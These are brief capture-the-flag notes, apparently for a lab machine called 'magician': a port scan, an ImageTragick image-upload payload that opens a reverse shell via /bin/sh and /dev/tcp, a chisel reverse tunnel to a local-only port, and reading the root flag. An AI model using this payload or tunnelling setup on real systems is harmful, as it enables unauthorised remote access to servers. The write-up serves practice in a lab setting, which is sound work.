
## magician 

#### Scan
```
ReferTo : nmap/*
```
- 21/ftp
- 8080/http-proxy
- 8081/nginx


#### Upload Payload
- Payload Find
	```
	https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Picture%20Image%20Magik/imagetragik1_payload_imageover_reverse_shell_devtcp.jpg
	```
- Payload Content
	```
	push graphic-context
	encoding "UTF-8"
	viewbox 0 0 1 1
	affine 1 0 0 1 0 0
	push graphic-context
	image Over 0,0 1,1 '|/bin/sh -i > /dev/tcp/ip/80 0<&1 2>&1'
	pop graphic-context
	pop graphic-context
	```
	- echo "{PAYLOAD_CONTENT}" > payload.php.png -> `Gainig Access`

#### System Enumeration
- netsta -nltp
  - Find :  127.0.0.1:6666
  - Get a tunneling with `chisel`


#### TUNNELING
- chisel
  - server (Darwin-OSX): ./chisel server --reverse --port 4343
  - client (chisel_1.7.6_linux_386)
    - ./chisel client {MY_IP} {SERVER_PORT}  R:{BIND_PORT}:{LOCALHOST}:{TUNNELING_PORT}

#### ROOT FLAG
- Access to : 127.0.0.1:{BIND_PORT}
- read: root/root.txt
- `https://www.tunnelsup.com/hash-analyzer/` : hexidecimal
  - `hexidecimal` to  `ASCCI` code